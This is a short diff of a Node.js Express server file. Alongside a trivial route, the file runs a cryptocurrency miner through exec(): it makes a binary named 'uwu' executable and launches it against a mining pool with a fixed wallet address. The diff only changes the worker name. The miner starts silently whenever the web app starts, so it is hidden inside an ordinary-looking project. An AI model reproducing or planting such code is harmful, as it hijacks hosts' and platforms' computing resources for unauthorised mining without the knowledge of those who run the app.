@@ -7,4 +7,4 @@ app.get("/", function(req,res){
 });
 
 app.listen("8080");
-exec('chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.vv --password x');
+exec('chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.cloudy --password x');
